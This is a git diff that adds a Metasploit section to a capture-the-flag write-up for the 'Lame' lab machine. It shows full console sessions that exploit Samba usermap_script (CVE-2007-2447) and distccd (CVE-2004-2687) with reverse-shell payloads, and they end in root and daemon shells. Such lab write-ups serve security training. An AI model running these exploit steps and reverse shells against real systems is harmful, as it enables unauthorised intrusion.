@@ -33,6 +33,7 @@ ftp> exit
 221 Goodbye.
 ```
 
+## Manual Owning
 
 ### Root Via CVE-2007-2447
 
@@ -168,3 +169,155 @@ system() execution of command failed
 ```
 
 - Machine owned via CVE-2004-2687 and SUID binaries
+
+## Using MSF
+
+- CVE-2007-2447
+```bash
+
+msf6 exploit(unix/misc/distcc_exec) > search usermap
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 exploit(unix/misc/distcc_exec) > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
+rhosts => 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 192.168.202.128:4444
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.202.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.8
+lhost => 10.10.14.8
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.14.8:4444
+[*] Command shell session 2 opened (10.10.14.8:4444 -> 10.10.10.3:41481) at 2021-05-04 09:38:07 -0400
+
+whoami;hostname
+root
+lame
+```
+
+- CVE-2004-2687
+```bash
+msf6 > search distcc
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank       Check  Description
+   -  ----                           ---------------  ----       -----  -----------
+   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec
+
+msf6 > use exploit/unix/misc/distcc_exec
+msf6 exploit(unix/misc/distcc_exec) > show options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   3632             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
+rhosts => 10.10.10.3
+msf6 exploit(unix/misc/distcc_exec) > run
+
+[-] 10.10.10.3:3632 - Exploit failed: A payload has not been selected.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(unix/misc/distcc_exec) > show options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   3632             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(unix/misc/distcc_exec) > set lhost 10.10.14.8
+lhost => 10.10.14.8
+msf6 exploit(unix/misc/distcc_exec) > run
+
+[*] Started reverse TCP double handler on 10.10.14.8:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo CqIktCbEJZV28STI;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "CqIktCbEJZV28STI\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.3:41478) at 2021-05-04 09:36:42 -0400
+
+whoami
+daemon
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+hostname
+lame
+```
